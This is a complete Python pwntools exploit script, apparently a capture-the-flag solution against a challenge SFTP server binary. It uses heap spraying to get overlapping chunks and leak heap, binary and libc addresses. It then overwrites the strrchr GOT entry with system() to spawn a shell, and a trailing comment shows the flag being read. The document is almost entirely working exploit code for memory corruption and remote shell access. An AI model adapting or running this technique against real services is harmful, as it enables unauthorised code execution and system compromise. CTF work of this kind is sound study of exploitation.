#!/usr/bin/env python

from pwn import *
from struct import *
import sys

context.log_level = "info"


def putFile(data, name):

	log.info("putFile() %s [%d]", name, len(data))

	r.sendlineafter("sftp> ", "put %s" % name)
	ll = len(data)
	r.sendline("%d" % ll)
	r.send(data)

	return name

def getFile(sz, name):

	r.sendlineafter("sftp> ", "get %s" % name)
	r.readuntil("%d\n" % sz)

	data = r.recvn(sz)

	return data


def checkFile(sz, ch, name):

	data = getFile(sz, name)

	log.info("read file %s [%d]", name, sz)

	for x in data:

		if x != ch:

			log.info("got leak!")

			leak = data.strip(ch)

			if len(leak) > 2:

				log.info("got data leak!")

				offset = data.find(x)

				open("leak", "wb").write(leak)
				open("leakf", "wb").write(data)

				return leak, offset, data


if __name__ == "__main__":

	if 'r' in sys.argv:
		r = remote("sftp.ctfcompetition.com", 1337)
	else:
		r = process("./sftp")

	if 'd' in sys.argv:

		d = gdb.attach(r.pid, """

c
""")

	r.sendlineafter("Are you sure you want to continue connecting (yes/no)? ", "yes")
	r.sendlineafter("c01db33f@sftp.google.ctf's password: ", "Steve")


	maxLen = 65535
	lenMax = 10
	lenMin = 300


	#raw_input("gdb")

	#
	# alloc large
	#


	for i in range(0, lenMax):

		putFile('\x41' * maxLen, "large%s" % i)

	#r.interactive()

	idx = 0

	leak = ''

	while (1):

		minFiles = []

		

		print(".")


		#
		# alloc min
		#

		for i in range(0, lenMin):
			idx += 1
			minFiles.append(putFile('\x41'*8, "min%d" % idx))

		#
		# check large
		#

		for i in range(0, lenMax):

			c = checkFile(maxLen, '\x41', "large%d" % i)

			if not c:
				continue

			leak, offset, origData = c

			if len(leak) > 48:
				leak = leak[:48]

			#leak += '\x00' * 4 # 

			overlappedName = "large%d" % i

			p0 = unpack("<Q", leak[:8])[0]
			p1 = unpack("<Q", leak[0x28:0x28 + 8])[0]

			log.info("leak addr0 0x%x" % p0)
			log.info("leak addr1 0x%x" % p1)


			nameChk = ''

			for i in range(0xc, 0xc+10):

				if leak[i] != '\x00':
					nameChk += leak[i]
				else:
					break

		
			log.info("leaked chunk name = %s" % nameChk)
			log.info("chunk was overlapped with = %s" % overlappedName)
			log.info("offset in overlapped chunk  = %d" % offset)

			#
			# lets leak some data from ./sftp binary
			#

			payload = leak[:0x28] + p64(p0)

			open("payload", "w").write(payload)

			payload = origData[:offset] + payload + origData[offset + len(payload):]

			context.log_level = "debug"

			putFile(payload, overlappedName)

			data = getFile(8, nameChk)

			readPtr = unpack("<Q", data[:8])[0]

			log.info("readPtr = 0x%x", readPtr) # this offset in .bss 0x208be0

			#
			# read .got.plt strlen()
			#

			sftpBase = readPtr - 0x208be0
			sftpGotStrrchr = sftpBase + 0x205058

			log.info("sftp base @ 0x%x", sftpBase)
			log.info("strrchr() .got.plt @ 0x%x", sftpGotStrrchr)

			payload = leak[:0x28] + p64(sftpGotStrrchr)
			payload = origData[:offset] + payload + origData[offset + len(payload):]
			putFile(payload, overlappedName)

			data = getFile(8, nameChk)

			strlenLibc = unpack("<Q", data[:8])[0]

			log.info("strlen() @ 0x%x", strlenLibc)

			#
			# overwrite .got.plt strlen()
			#

			e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

			libcBase = strlenLibc - e.symbols['strrchr']

			systemLibc = libcBase + e.symbols['system']
			log.info("system() @ 0x%x", systemLibc)

			data = putFile(p64(systemLibc), nameChk)

			r.sendlineafter("sftp> ", "mkdir sh")

			r.sendline("ls")

			r.interactive()

			# $ cat /home/user/flag
			# [DEBUG] Sent 0x14 bytes:
			#     'cat /home/user/flag\n'
			# [DEBUG] Received 0x22 bytes:
			#     'CTF{Moar_Randomz_Moar_Mitigatez!}\n'
			# CTF{Moar_Randomz_Moar_Mitigatez!}

